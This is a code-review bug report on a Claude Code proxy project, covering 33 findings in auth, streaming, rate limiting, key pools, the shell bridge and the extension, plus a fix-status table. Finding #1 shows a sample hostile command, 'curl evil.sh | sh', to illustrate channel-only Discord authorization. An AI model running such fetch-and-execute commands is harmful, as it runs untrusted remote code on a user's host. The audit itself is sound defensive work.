# Bug Report — kingjboy-claude-code (v6.24.0)

## Fix status (2026-11-01)

30 of 33 findings are fixed in the working tree (not committed). Three were left as they are, with the reason below.

**Verified.** After `uv` was updated to 0.13.6:
- `uv run pytest`: 3466 passed, 61 skipped. That's 18 more tests than the original suite (3448), all from this work.
- `ruff format --check`, `ruff check`, `ty check` and the repo's `suppressions` check all pass.

In 4 of 5 full runs everything passed. In the other, the existing test `test_hedged_racing_fast_first_key_does_not_fire_second_key` failed once under parallel load. It races a 10 ms open against a 100 ms hedge delay, it passed 10 of 10 times when run on its own, and that code path wasn't changed.

One new test, the symlinked-home bridge test, skips on this Windows machine because creating symlinks needs extra privileges here. It runs on Linux and macOS.

| # | Status | Fix |
| --- | --- | --- |
| 1 | Fixed | New required `ALLOWED_DISCORD_USERS` setting (Admin UI, `.env.example`, README). Messages from unlisted users are ignored, including voice notes. An empty list admits nobody, matching Telegram. **Existing Discord setups must add their user ID.** |
| 2 | Fixed | Approval cards take the turn's abort signal, so Stop settles a pending card as denied. |
| 3 | Fixed | Every `tool_use` gets a `tool_result` ("Not run: the user stopped this turn.") on Stop. A reply cut off with half-streamed tool calls drops those calls instead of storing them. |
| 4 | Fixed | A `Retry-After` up to 120 s is still honoured. A longer one is a final 429 straight away, with no recovery episode and no other requests parked. |
| 5 | Fixed | `finish_reason` is read before the `delta is None` guard. |
| 6 | **No change** | By design. `tests/providers/test_provider_runtime.py` states that "pool providers keep their published per-key RPM even when a shared non-pool override is configured". The fix was written, broke that test, and was reverted. For headroom on pooled keys, set the per-key limit slightly below the provider's quota (e.g. `NVIDIA_NIM_KEY_RATE_LIMIT=38`). |
| 7 | Fixed | Explicit refresh and connected-account discovery lease the generation and run outside `_replace_lock`. |
| 8 | Fixed | When the last hedged racer fails on its own key, the request falls through to the rest of the pool. |
| 9 | Fixed | The shell root is always `.resolve()`d. |
| 10 | Fixed | Audit outcomes are now `refused`, `timeout` or `spawn_failed`. Timeouts are logged against the directory the command ran in. |
| 11 | Fixed | When nothing fits under the cap, the stored conversation is removed instead of left stale. |
| 12 | Fixed | A replacement runtime snapshots the previous generation's key-pool state (retired keys, cooldowns, per-key send times) and applies it to providers it builds later. |
| 13 | Fixed | A pool whose keys are all disabled raises a non-retryable 401 (authentication), not a 429. |
| 14 | Fixed | The web-tool intercept counts tokens in a worker thread inside the stream. |
| 15 | Fixed | The per-key client cache is keyed on `(id(client), key)`. |
| 16 | **No change** | On closer reading this was overstated. `try_acquire_hedge_slot` checks `locked()` (which includes waiters) before decrementing, which is exactly asyncio's own fast path, and `release()` goes through the public API. Only the use of a private attribute remains, which is a style concern, not a bug. |
| 17 | Fixed | The three `*_API_KEYS` settings are validated at startup, and the error names the variable. |
| 18 | Fixed | Context cells must be ASCII decimal digits. `²` is now ignored instead of crashing. |
| 19 | Fixed | An unreadable `sessions.json` is renamed to `sessions.json.corrupt-<timestamp>` before the store starts empty. |
| 20 | **No change** | The current-directory `.env` is a documented feature ("repo-local `.env`", ARCHITECTURE.md §Configuration Model), with tests and a migration into `~/.fcc/.env` on first Admin apply. Changing it would break intended behaviour. If you want it gone, that's a design decision to make separately. |
| 21 | Fixed | Injected selector functions catch invalid selectors and report "Invalid CSS selector …". A missing injection result raises a clear error. |
| 22 | Fixed | Links are split out before emphasis is applied. Covered by a new assertion in `tests/cli/test_extension.py` (checked with node). |
| 23 | Fixed | `< 4`. |
| 24 | Fixed | The panel also reads `input_tokens` from `message_start`. |
| 25 | Fixed | Output is decoded as UTF-8 (tolerating a character cut by the capture limit), then the Windows OEM code page, then UTF-8 with replacement. |
| 26 | Fixed | Shutdown waits up to 60 s for leases, then force-closes generations. |
| 27 | Fixed | Keepalive pings run only while the provider has served a request in the last 5 minutes. |
| N1 | Fixed | `sync_pinned_context_windows(..., retain_refs=...)` keeps existing rows for configured routes. It's used at startup and on Admin apply. |
| N2 | Fixed | Placeholder rows still block a curated guess, but no longer hide a provider-reported window. Measured `unknown` rows still suppress everything, as before. |
| N3 | Fixed | Token counting always runs in a worker thread. The cache is keyed by a 16-byte BLAKE2 digest (8192 entries, thread-safe), not the full text. |
| N4 | Fixed | The third-key cascade was removed: at most two racers. |
| N5 | Fixed | `context.md` is synced before `.env` is replaced. |
| N6 | Fixed | `/v1/models` reads `context.md` once per call (`load_context_window_maps`). |

New or updated tests: `tests/providers/test_hedging.py`, `test_provider_admission.py`, `test_key_pool.py`, `tests/config/test_config.py`, `test_context_windows.py`, `tests/api/test_model_listing.py`, `tests/cli/test_bridge.py`, `test_extension.py`, `tests/messaging/test_discord_platform.py`, `test_messaging_factory.py`, `test_voice_handlers.py`, `test_session_store_edge_cases.py`.

---

**Rescanned on 2026-11-01 at `98fe372` (v6.24.0).** Four new commits (v6.22.0 to v6.24.0) changed 28 files. All the changed source was reviewed. Results:
- **6 new bugs**, listed directly below as N1–N6.
- **None of the original 27 is fully fixed.** #18 is partly fixed. #8 and #27 got worse. Line numbers in `openai_chat/provider.py` have been updated to the new code.

## New in v6.22.0 – v6.24.0

### N1. (High) Every startup and every Admin apply deletes measured context windows for your model routes
- **Where:** `src/free_claude_code/config/context_windows.py:171` (`sync_pinned_context_windows`), called from `src/free_claude_code/runtime/application.py:183` on startup and from `config/admin/persistence.py` on every apply when `context.md` exists
- **What:** The sync rewrites `context.md` so it "holds ONLY `pinned_refs`". But `fcc-context` (`cli/context_scan.py:149-155`) records the pinned list **plus every configured route** (`MODEL`, `MODEL_OPUS/SONNET/HAIKU/FABLE`, fallbacks), and `resolve_client_context_window` reads those route rows to decide the client's window.
- **Failure scenario:** `MODEL=nvidia_nim/x` isn't in `PINNED_MODELS`. The user runs `fcc-context`, and the measured row is written. On the next server start the row is deleted, and the Claude Code window falls back to the curated value or the default. Claude Code then compacts against the wrong number, or overflows the real context. The measurement is lost every time and can't be kept.
- **Fix:** Keep rows for `configured_chat_model_refs(settings)` as well as pinned refs, as `fcc-context` does. Or only prune rows the Admin UI created.

### N2. (Medium) Newly pinned models now hide the context window the provider reports
- **Where:** `src/free_claude_code/api/model_catalog.py:318`, `src/free_claude_code/config/context_windows.py` (`resolve_client_context_window`, the `unresolved` skip)
- **What:** The sync seeds every pinned model as an `unknown` row. `_resolve_inventory_context_window` now returns `None` for `unknown` refs **before** it checks `model_info_tokens` (the window the provider itself publishes, e.g. OpenRouter's `context_length`) or the curated table. `resolve_client_context_window` likewise skips the curated fallback for them.
- **Failure scenario:** The user pins an OpenRouter model whose `/models` entry reports 262144. `/v1/models` now advertises no context window for it, and the client gets the default, until someone types the number into the Admin UI by hand. Before v6.23.0 it was picked up automatically.
- **Fix:** Treat `unknown` as "no manual override": fall through to `model_info_tokens` and then the curated value.

### N3. (Medium) The default token counter now runs on the event loop, and its cache holds whole texts
- **Where:** `src/free_claude_code/application/execution.py:142`, `src/free_claude_code/core/anthropic/tokens.py:16`
- **What:** When the counter is `get_token_count` (the default), the executor now calls it directly instead of in `asyncio.to_thread`. `count_tokens` itself is deliberately run in a worker thread, because it measures about 90 ms per 100k tokens. `_count_text_tokens` is now `@lru_cache(maxsize=8192)`, keyed on the **full text** of every message block.
- **Failure scenario:** (a) A turn with a fresh 200 KB tool result stalls every other in-flight stream while it's encoded. (b) Long agent sessions fill the cache with up to 8192 distinct large strings (file reads, command output, base64-free documents), so memory grows by hundreds of MB to GB and is never released.
- **Fix:** Restore `to_thread` for large inputs, or for all inputs. Key the cache on a hash plus length, or cap it by total size rather than entry count.

### N4. (Medium) Hedging on first token sends duplicate full requests for slow reasoning models
- **Where:** `src/free_claude_code/providers/openai_chat/provider.py:632-800` (`_open_chat_stream_hedged`, `_open_on_key` priming, third-key cascade at `:751`)
- **What:** The race now waits for the **first meaningful token** (`prime_first_chunk`) instead of response headers, and after another `hedge_delay` it adds a third key. Reasoning models routinely spend longer than any small hedge delay before their first token (the code's own comments mention 20 s+ of thinking, and 209 s on a loaded NIM).
- **Failure scenario:** With `KEY_HEDGE_DELAY_SECONDS=3` and a model that thinks for 15 s, nearly every request becomes 2–3 complete upstream generations. Each one uses tokens and per-key RPM before the losers are cancelled, which can multiply quota use per request by up to 3 and cause the 429s hedging is meant to avoid.
- **Fix:** Hedge on headers (as before) or on a much longer TTFT threshold, skip hedging for requests with reasoning enabled, and leave the third-key cascade off by default.

### N5. (Low) Apply can save `.env` and then report a failure
- **Where:** `src/free_claude_code/config/admin/persistence.py` (`commit_prepared_admin_update`, the new `sync_pinned_context_windows` call after `os.replace`)
- **What:** The `.env` file is replaced first, and the `context.md` sync runs afterwards without any error handling. If the sync raises (for example a locked file on Windows, or a permission error), the request fails even though the new `.env` is already on disk.
- **Failure scenario:** The Admin UI shows "apply failed", but the settings did change, and the provider generation was never swapped to match.
- **Fix:** Write `context.md` first (both are prepared up front), or catch and report a sync failure separately.

### N6. (Low) `/v1/models` reads and parses `context.md` twice on every call
- **Where:** `src/free_claude_code/api/model_catalog.py:163-164` and `:335-336`
- **What:** `load_context_windows()` and `load_unresolved_context_windows()` each re-read and re-parse the file. Claude Code calls `/v1/models` at every launch, and the Admin UI calls it on load.
- **Fix:** Call `load_context_window_entries()` once and derive both maps from the result.

---

## Original findings (first scan of `c13e30c`, line numbers updated where code moved)

Code review of commit `c13e30c` on `main`. The review focused on the parts of the code that are most likely to fail or be abused: request ingress and auth, provider streaming and retry/admission, credential pooling, runtime generations, web-fetch egress, the browser shell bridge, the Chrome extension, messaging bots, and settings and `.env` persistence.

**Coverage note.** Not every one of the ~200 source files was read line by line. The modules listed under "Reviewed" at the end were read closely. The rest (message-tree internals, most client launchers, the Anthropic↔OpenAI conversion helpers, the Responses streaming assembler, the NIM/DeepSeek/Gemini adapters) were only skimmed or not read, and could still hide bugs. I couldn't run the test suite (`uv run pytest`, `ruff`, `ty`) because the execution permission was denied in this session, so none of these findings are test-confirmed. Each one comes from reading the code and includes a concrete failure scenario.

Severity scale: **Critical**: security exposure or data loss · **High**: user-visible breakage on a common path · **Medium**: wrong behaviour in realistic conditions · **Low**: edge cases, robustness, efficiency.

---

## Critical

### 1. Discord bot gives every member of an allowed channel unrestricted shell access to the host
- **Where:** `src/free_claude_code/messaging/platforms/discord.py:177`, `src/free_claude_code/cli/managed/claude.py:156,167`
- **What:** Discord messages are authorized by **channel only**: anyone posting in an `ALLOWED_DISCORD_CHANNELS` channel is accepted. Telegram, by contrast, checks a single `ALLOWED_TELEGRAM_USER_ID`. Each accepted message is run by Claude Code with `--dangerously-skip-permissions`, and `ALLOWED_DIR` only adds `--add-dir`, so it is not a sandbox.
- **Failure scenario:** The owner allows `#dev` in a server with ten members. Any of them can post "run `curl evil.sh | sh`" (or send a voice note, which takes the same channel-only path) and it runs as the owner's user with no prompt.
- **Fix:** Add an `ALLOWED_DISCORD_USER_IDS` allow-list and check `message.author.id` alongside the channel, or refuse to start the Discord platform without one.

## High

### 2. Stop doesn't cancel a pending approval, and clicking Allow afterwards still runs the action
- **Where:** `src/free_claude_code/cli/extension_assets/sidepanel.js:703` (`requestApproval`), `:743-767` (`runTool`), `:943` (stop handler)
- **What:** `requestApproval` returns a promise that only Allow or Deny can settle. The Stop button aborts `stopController`, but nothing listens to that signal while an approval card is open.
- **Failure scenario:** The model asks to run `rm -rf build`. The user presses **Stop**. The panel stays `busy` (Send disabled, Stop does nothing) until a card button is clicked. If the user then clicks **Allow** (for example while clearing the card), the command is sent to the native host even though the turn was stopped.
- **Fix:** Pass the abort signal into `requestApproval` and settle it as denied on `abort`. Re-check `signal.aborted` right before `sendNative` and `runPageTool`.

### 3. The side panel can leave a `tool_use` without its `tool_result` in history, which breaks every later request
- **Where:** `src/free_claude_code/cli/extension_assets/sidepanel.js:815-829`
- **What:** The assistant turn, including its `tool_use` blocks, is pushed to `history` before the tools run. Three paths then leave tool calls with no matching `tool_result`:
  1. `stopReason` is `max_tokens` (or anything other than `tool_use`) while tool blocks are present, so the function returns at line 817.
  2. The user stops during the tool loop, so the `break` at line 822 leaves the remaining calls without results.
  3. The user stops before the first tool runs, so `results` is empty and line 827 returns.
- **Failure scenario:** The user stops while the second of three tool calls is waiting for approval. The next message sends a history with unanswered tool calls, and the provider rejects it ("tool_use ids were found without tool_result blocks"). The conversation can't continue until Clear.
- **Fix:** For every `tool_use` that didn't run, append a synthetic `{type:"tool_result", is_error:true, content:"Cancelled by the user."}`. Or drop the `tool_use` blocks from the stored assistant turn when the loop exits early.

### 4. An upstream `Retry-After` is never capped and can freeze a model for hours
- **Where:** `src/free_claude_code/providers/admission.py:876` (`_retry_delay`), used by `_attempt_failed` and `_accepted_attempt_failed`
- **What:** `return max(backoff, retry_after or 0.0)` ignores `max_delay` (60 s) whenever the upstream sends `Retry-After`. `retry_after_seconds` accepts any non-negative value, including HTTP-dates far in the future.
- **Failure scenario:** OpenRouter or NIM returns a 429 with `Retry-After: 86400` when a daily free quota is used up. A recovery episode opens with `ready_at` a day away. Every concurrent request for that model waits on the episode, and new requests either park or fail with `ProviderRecoveryExhausted` once `terminal_until` is set for up to a day. Clients appear to hang until their own timeouts fire.
- **Fix:** Clamp the value to `max_delay` (or a separate ceiling of a few minutes). When `Retry-After` is above that ceiling, fail fast with a typed 429 instead of sleeping.

## Medium

### 5. A final chunk with `delta: null` loses its `finish_reason`, so complete replies get retried
- **Where:** `src/free_claude_code/providers/openai_chat/provider.py:1151-1154` *(still present in v6.24.0)*
- **What:** The main stream loop runs `if delta is None: continue` **before** it reads `choice.finish_reason`. The recovery collector (`:1653-1660`) does it in the correct order. Some OpenAI-compatible backends send the terminal chunk as `{"finish_reason":"stop","delta":null}` (or with no delta).
- **Failure scenario:** A complete answer arrives, the terminal chunk is skipped, and `finish_reason` stays `None`. Line 1199 then raises `TruncatedProviderStreamError`, which triggers mid-stream recovery, extra upstream calls, wasted quota, and sometimes duplicated text.
- **Fix:** Read `choice.finish_reason` (and run the context-window check) before the `delta is None` guard, as the recovery path does.

### 6. Pooled providers ignore `PROVIDER_RATE_LIMIT`, `PROVIDER_RATE_WINDOW` and `PROVIDER_RATE_MARGIN`
- **Where:** `src/free_claude_code/providers/runtime/config.py:205-210`
- **What:** For `nvidia_nim`, `open_router` and `custom`, the provider-wide limit is overwritten with `key_rate_limit * len(api_keys)` and the window is forced to 60 s. The margin that `resolve_rate_policy` says it "applies once at this provider-wide gate" is dropped, and the operator's explicit settings are ignored. Each key's own limiter also runs at exactly the published quota (40 RPM for NIM by default) with no headroom.
- **Failure scenario:** With NIM at 40 RPM per key, the proxy sends a 40th request in the same window that NIM counted on arrival, and NIM answers 429. Setting `PROVIDER_RATE_LIMIT=20` to back off silently does nothing.
- **Fix:** Apply `rate_with_margin` to `key_rate_limit`, and let an operator-configured `PROVIDER_RATE_LIMIT`/`WINDOW` take precedence as the docstring promises.

### 7. Refreshing models, or connecting an account, blocks every new inference request
- **Where:** `src/free_claude_code/runtime/provider_manager.py:130-136` (`acquire`), `:197-203` (`refresh_model_list_cache`), `:205-226` (`connected_provider_changed`)
- **What:** `acquire()`, called once per `/v1/messages` and `/v1/responses` request, takes `_replace_lock`. The admin "Refresh models" action and connected-account changes hold that same lock while they make network calls to every provider.
- **Failure scenario:** One provider is offline and its model-list call waits out the HTTP timeout. For that whole time, every Claude Code request queues in `acquire()` and the proxy looks frozen.
- **Fix:** Snapshot `self._current` under the lock, then release the lock before network discovery. Or give leases their own lock, since `acquire` only needs to read `_current` atomically.

### 8. Hedged key opens don't fall back to the remaining pool keys when both racers fail
- **Where:** `src/free_claude_code/providers/openai_chat/provider.py:794-797` *(v6.24.0: still present, and now affects up to three racers)*
- **What:** If both hedged opens fail with key-scoped errors (401, 403 or 429), `_handle_key_error` marks both keys, and then `raise last_exc` runs. The sequential and single-racer paths instead go on to `_open_chat_stream_sequential` and try the other keys. `return await self._open_chat_stream_sequential(...)` at line 759 can't be reached.
- **Failure scenario:** A pool has 5 keys and `KEY_HEDGE_DELAY_SECONDS>0`. Keys 1 and 2 are both rate-limited. The request fails even though keys 3–5 are idle.
- **Fix:** Only re-raise when the last error was not handled as a key error. Otherwise call the sequential path.

### 9. The shell bridge refuses every `cwd` when the home directory path contains a symlink or junction
- **Where:** `src/free_claude_code/cli/bridge.py:87` (`shell_root`), `:102-103` (`resolve_cwd`)
- **What:** When `BROWSER_SHELL_ROOT` is blank, the root is `Path.home()` **without** `.resolve()`, but the requested directory is resolved. Comparing a resolved path against an unresolved root fails whenever the two differ.
- **Failure scenario:** On Fedora Silverblue (`/home` → `/var/home`), with `$HOME` behind a symlink, or with a Windows profile on a junction, `run_command` with `cwd: "project"` is refused as "outside BROWSER_SHELL_ROOT".
- **Fix:** `return ... if configured else Path.home().resolve()`.

### 10. The bridge audit log records commands that ran (and timed out) as "refused"
- **Where:** `src/free_claude_code/cli/bridge.py:269-278`
- **What:** Every `BridgeError` is logged as `refused` against the root directory. That includes the timeout raised after a command was started and then killed, and "could not start a shell".
- **Failure scenario:** An approved command runs for 120 s in `~/proj/api`, partly modifies files, and is killed. The security audit log says it was refused in `~`, so anyone reviewing the log is misled about what ran and where.
- **Fix:** Use distinct outcomes (`refused`, `timeout`, `spawn_failed`) and log the resolved `cwd` once it's known.

### 11. When the conversation gets too large to trim, the panel keeps a stale copy and restores it later
- **Where:** `src/free_claude_code/cli/extension_assets/sidepanel.js:608-614`
- **What:** If `trimLeading` can't find a cut point (for example one huge screenshot turn), `saveConversation` returns without writing. The previously saved conversation stays in `chrome.storage.local`.
- **Failure scenario:** The user has a long chat with screenshots, closes the panel and reopens it. An older version of the conversation (and an older pinned tab) is restored, silently discarding the recent turns.
- **Fix:** When trimming can't get under the cap, remove `CONVERSATION_KEY` or store a stub, rather than leaving the old snapshot.

### 12. A config change resets key-pool health and rate windows while old requests are still running
- **Where:** `src/free_claude_code/providers/openai_chat/provider.py:278-287`, `src/free_claude_code/runtime/provider_manager.py:238-296` (`replace`)
- **What:** Each provider generation builds a fresh `ApiKeyPool` and `ProviderAdmissionController`. On an Admin "apply", keys that were permanently disabled come back, cooldowns are cleared, and the sliding windows start empty. The old generation keeps streaming on the same keys at the same time.
- **Failure scenario:** The user saves an unrelated setting while busy. The new generation can immediately send a full window of requests per key on top of the old generation's in-flight ones, causing 429 storms, and it retries keys that were just found to be revoked.
- **Fix:** Carry the pool and limiter state across generations when the key list is unchanged, or share the pool by provider id and key.

### 13. A pool whose keys are all dead is reported as a retryable 429 forever
- **Where:** `src/free_claude_code/providers/key_pool.py`, `mark_failed` (3-strike disable), and `src/free_claude_code/providers/openai_chat/provider.py:624-630`
- **What:** After 3 consecutive auth failures a key is disabled for the life of the process. Once every key is disabled, `get_next_key()` always returns `None`, and the error raised is `FailureKind.RATE_LIMIT`, status 429, `retryable=True`.
- **Failure scenario:** All keys are revoked. Claude Code is told it's being rate-limited and keeps retrying, while the real cause (bad credentials) never reaches the user.
- **Fix:** If every key is `failed`, raise an authentication failure (401, not retryable) that says the pool is exhausted.

## Low

### 14. The web-server-tool path counts tokens on the event loop
- **Where:** `src/free_claude_code/api/handlers/messages.py:364-370`
- **What:** `_intercept_web_server_tool` calls `self._token_counter(...)` synchronously. Everywhere else it runs in `asyncio.to_thread`, because the `count_tokens` docstring measures ~90 ms per 100k tokens.
- **Failure scenario:** A large web_search or web_fetch request stalls every in-flight stream for that long.
- **Fix:** Make the intercept async, or count lazily inside the stream generator.

### 15. The per-key client cache uses an unstable `id()` key
- **Where:** `src/free_claude_code/providers/openai_chat/provider.py:327-338`
- **What:** The cache key includes `id(getattr(self._client, "with_options", None))`. A bound method is a new object on every access, so its `id` is only reused by chance.
- **Failure scenario:** When the id isn't reused, the cache misses and a new `with_options` client is added on every request. `_key_clients` grows for the life of the provider.
- **Fix:** Key on `key` alone (the client is fixed for the provider's lifetime).

### 16. The hedge slot is taken by editing `asyncio.Semaphore._value` directly
- **Where:** `src/free_claude_code/providers/admission.py:313` *(v6.24.0: it can now be taken twice per request by the third-key cascade)*
- **What:** `self._concurrency_sem._value -= 1` writes a private CPython attribute and skips the semaphore's bookkeeping. It also takes a proactive-limiter token before checking the semaphore can be taken atomically.
- **Failure scenario:** An asyncio change to the internals, or a waiter queued between `locked()` and the write, can leave the count wrong and permanently shrink or grow concurrency.
- **Fix:** Use a separate counter or semaphore for hedge slots, or `acquire()` with a zero timeout.

### 17. A malformed key-pool JSON raises a raw exception instead of a config error
- **Where:** `src/free_claude_code/config/api_key_pool.py:18-19`
- **What:** `json.loads` on something like `NVIDIA_NIM_API_KEYS=[abc` raises `JSONDecodeError` when the provider is built, not at settings validation. The user gets a generic 500 instead of "fix NVIDIA_NIM_API_KEYS".
- **Fix:** Validate the three `*_API_KEYS` fields with a `field_validator` that calls `parse_api_key_pool`.

### 18. `context.md` parsing can crash, and a `0` window is accepted
- **Where:** `src/free_claude_code/config/context_windows.py:86` *(v6.24.0: partly fixed. A `0` is now ignored, but the crash remains, and the file is now also parsed on every `/v1/models` call and every startup sync, so it has more callers)*
- **What:** `str.isdigit()` is true for characters like `²`, which `int()` rejects, so a stray superscript raises `ValueError`. The docstring says malformed files return `{}`. ~~A recorded `0` is also accepted and wins `min(known)`.~~
- **Failure scenario:** A typo in the table stops CLI launches, or Claude Code is told the context window is 0 and compacts on every turn.
- **Fix:** Use `isdecimal()` inside a `try`, and ignore values `<= 0`.

### 19. A corrupted `sessions.json` is silently overwritten with no backup
- **Where:** `src/free_claude_code/messaging/session/store.py:55-59`
- **What:** A failed load is logged and the store starts empty. The next debounced save replaces the corrupt file.
- **Failure scenario:** A partial write or bad edit loses every messaging conversation for good.
- **Fix:** Move the unreadable file aside (for example `sessions.json.corrupt-<ts>`) before continuing.

### 20. Settings read a `.env` from whatever directory the process was started in
- **Where:** `src/free_claude_code/config/env_files.py:37-40,52-61`
- **What:** `repo_env_path()` is `Path(".env")` relative to the current directory. With `env_ignore_empty=True`, blank values in the managed `~/.fcc/.env` don't override it.
- **Failure scenario:** Running `fcc-server` from inside a cloned project picks up that project's `.env`, including keys the Admin UI doesn't manage and anything left blank in the managed file. For example `HOST=0.0.0.0`, or `BROWSER_SHELL_ROOT` (a blank value in `~/.fcc/.env` doesn't override the project's).
- **Fix:** Only read the repo `.env` when running from the source checkout, or anchor the path to the package root.

### 21. An invalid CSS selector produces a confusing tool error
- **Where:** `src/free_claude_code/cli/extension_assets/page_tools.js:204-213,262-268,327-340`
- **What:** `document.querySelector` throws on a bad selector inside the injected function. `executeScript` then returns a result with no `result` field, and `payload.missing` throws "Cannot read properties of undefined", which is what the model sees.
- **Fix:** Wrap the injected body in `try/catch` and return `{ error: e.message }`, then report "Invalid selector: …".

### 22. The markdown renderer applies emphasis inside link URLs
- **Where:** `src/free_claude_code/cli/extension_assets/markdown.js:27-31`
- **What:** Bold and italic replacement runs before link parsing. A URL containing `*` gets `<strong>` or `<em>` inserted into its `href`, and `a * b * c` becomes italic. It's still safe because the text is escaped first, but links render broken.
- **Fix:** Extract links first, or skip emphasis inside link targets.

### 23. Off-by-one in the IPv6 sockaddr guard
- **Where:** `src/free_claude_code/api/web_tools/outbound.py:116-118`
- **What:** `if len(sockaddr) < 3: continue` is followed by `sockaddr[3]`. A 3-tuple would raise `IndexError`.
- **Fix:** `< 4`.

### 24. The side panel under-reports input tokens
- **Where:** `src/free_claude_code/cli/extension_assets/sidepanel.js:384-387`
- **What:** Input usage is read only from `message_delta`. The `message_start` usage is ignored, and the proxy's synthesized streams (for example `_messages_response_to_sse_stream` in `api/handlers/messages.py`) put `input_tokens` only in `message_start`.
- **Fix:** Also read `event.message.usage.input_tokens` from `message_start`.

### 25. Bridge output is decoded as UTF-8 on Windows
- **Where:** `src/free_claude_code/cli/bridge.py:209-210`
- **What:** Windows PowerShell 5.1 and `cmd.exe` write in the OEM or ANSI code page, so non-ASCII output (paths, localized messages) comes back garbled.
- **Fix:** On Windows, decode with `locale.getpreferredencoding(False)` or the console code page, or force UTF-8 output on the shell side.

### 26. Shutdown can hang on a stuck lease
- **Where:** `src/free_claude_code/runtime/provider_manager.py:313-315`
- **What:** `close()` waits for `drained.wait()` on every generation with no timeout.
- **Failure scenario:** One long stream (bounded only by `PROVIDER_PROGRESS_TIMEOUT`, 1260 s by default), or a lease that is never released, blocks restart or stop from the Admin UI for up to 21 minutes, or indefinitely.
- **Fix:** Wrap the wait in `asyncio.timeout(...)`, then force-close.

### 27. Every provider sends a keepalive HEAD every 25 s forever
- **Where:** `src/free_claude_code/providers/openai_chat/provider.py:345-350` *(v6.24.0: worse. The interval dropped from 45 s to 25 s)*
- **What:** `_prewarm_and_keepalive` runs for every OpenAI-compatible provider instance, including idle and retired-but-draining generations. It sends a HEAD to the base URL every 25 s and swallows all errors.
- **Cost:** Constant background traffic to every configured provider even when the proxy is idle. Some gateways log or rate-count it.
- **Fix:** Only keep the connection warm after recent traffic, and stop when idle.

---

## Reviewed

Read closely: `api/app.py`, `api/routes.py`, `api/dependencies.py`, `api/admin_routes.py`, `api/handlers/messages.py`, `api/handlers/responses.py` (part), `api/web_tools/egress.py`, `api/web_tools/outbound.py`, `application/execution.py`, `providers/openai_chat/provider.py`, `providers/admission.py`, `providers/key_pool.py`, `providers/failure_policy.py` (part), `providers/openai_stream.py`, `providers/runtime/config.py`, `providers/openai_codex/auth.py` (credential writes), `core/rate_limit.py`, `core/interprocess_lock.py`, `core/openai_responses/state.py`, `config/settings.py`, `config/api_key_pool.py`, `config/env_files.py`, `config/context_windows.py`, `config/admin/persistence.py` (part), `config/provider_catalog.py` (part), `runtime/provider_manager.py`, `runtime/application.py` (part), `cli/bridge.py`, `cli/native_host.py`, `cli/claude_env.py`, `cli/proxy_auth.py`, `cli/managed/claude.py` (part), `cli/extension_assets/*` (manifest, service worker, side panel, page tools, shell tool, console probe, markdown), `messaging/platforms/telegram_inbound.py`, `messaging/platforms/discord.py` (part), `messaging/platforms/discord_inbound.py` (part), `messaging/session/store.py`, `messaging/session/persistence.py`, `messaging/limiter.py` (part).

Checked and found sound: proxy bearer auth (constant-time compare), admin loopback/Origin/Host/forwarded-header checks, SSRF pinning across redirects, native-host single-origin manifest, owner-only writes of `.env` and the Codex credential file, and atomic JSON persistence.
